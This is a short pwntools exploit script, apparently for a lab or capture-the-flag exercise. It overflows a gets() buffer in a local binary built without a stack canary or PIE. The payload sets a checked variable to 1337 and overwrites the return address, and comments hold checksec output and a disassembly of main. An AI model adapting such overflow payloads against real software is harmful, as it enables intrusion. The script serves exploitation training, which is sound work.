#!/usr/bin/env python3
from pwn import *
context.arch='amd64'
'''
 {'aarch64': {'bits': 64, 'endian': 'little'}, 'alpha': {'bits': 64, 'endian': 'little'}, 'amd64': {'bits': 64, 'endian': 'little'}, 'arm': {'bits': 32, 'endian': 'little'}, 'avr': {'bits': 8, 'endian': 'little'}, 'cris': {'bits': 32, 'endian': 'little'}, 'i386': {'bits': 32, 'endian': 'little'}, 'ia64': {'bits': 64, 'endian': 'big'}, 'm68k': {'bits': 32, 'endian': 'big'}, 'mips': {'bits': 32, 'endian': 'little'}, 'mips64': {'bits': 64, 'endian': 'little'}, 'msp430': {'bits': 16, 'endian': 'little'}, 'none': {}, 'powerpc': {'bits': 32, 'endian': 'big'}, 'powerpc64': {'bits': 64, 'endian': 'big'}, 's390': {'bits': 32, 'endian': 'big'}, 'sparc': {'bits': 32, 'endian': 'big'}, 'sparc64': {'bits': 64, 'endian': 'big'}, 'thumb': {'bits': 32, 'endian': 'little'}, 'vax': {'bits': 32, 'endian': 'little'}}
'''
'''
 gcc -no - pie -fno - stack - protector target .c
$ checksec a. out
[*] ’ lab1 /a. out ’
Arch : amd64 -64 - little
RELRO : Partial RELRO
Stack : No canary found
NX : NX enabled
PIE : No PIE (0 x400000 )
'''
r = process("./a.out")

buf = b'A' * 9
buf += p32(1337)
buf = buf.ljust(65, b'B')
buf += p64(0x401237)

log.info("Payload")
print(hexdump(buf, width=12))
r.writeline(buf)
r.interactive()
'''
gef > disassemble main
Dump of assembler code for function main :
=> 0 x00000000004012af <+0 >: endbr64
0 x00000000004012b3 <+4 >: push rbp
0 x00000000004012b4 <+5 >: mov rbp , rsp
0 x00000000004012b7 <+8 >: sub rsp ,0 x40
0 x00000000004012bb <+12 >: mov QWORD PTR [ rbp -0 x30 ] ,0 x0
0 x00000000004012c3 <+20 >: mov QWORD PTR [ rbp -0 x28 ] ,0 x0
0 x00000000004012cb <+28 >: mov QWORD PTR [ rbp -0 x20 ] ,0 x0
0 x00000000004012d3 <+36 >: mov QWORD PTR [ rbp -0 x18 ] ,0 x0
0 x00000000004012db <+44 >: mov DWORD PTR [ rbp -0 x10 ] ,0 x0
0 x00000000004012e2 <+51 >: mov QWORD PTR [ rbp -0 x39 ] ,0 x0
0 x00000000004012ea <+59 >: mov BYTE PTR [ rbp -0 x31 ] ,0 x0
0 x00000000004012ee <+63 >: lea rax ,[ rbp -0 x39 ]
0 x00000000004012f2 <+67 >: mov rdi , rax
0 x00000000004012f5 <+70 >: mov eax ,0 x0
0 x00000000004012fa <+75 >: call 0 x401080 < gets@plt >
0 x00000000004012ff <+80 >: mov eax , DWORD PTR [ rbp -0 x30 ]
0 x0000000000401302 <+83 >: cmp eax ,0 x539
0 x0000000000401307 <+88 >: je 0 x401313 < main +100 >
0 x0000000000401309 <+90 >: mov edi ,0 x1
0 x000000000040130e <+95 >: call 0 x401090 < exit@plt >
0 x0000000000401313 <+100 >: lea rdi ,[ rip +0 xdd9 ] # 0 x4020f3
0 x000000000040131a <+107 >: call 0 x401070 < puts@plt >
0 x000000000040131f <+112 >: mov eax ,0 x0
0 x0000000000401324 <+117 >: leave
0 x0000000000401325 <+118 >: ret
End of assembler dump .

'''
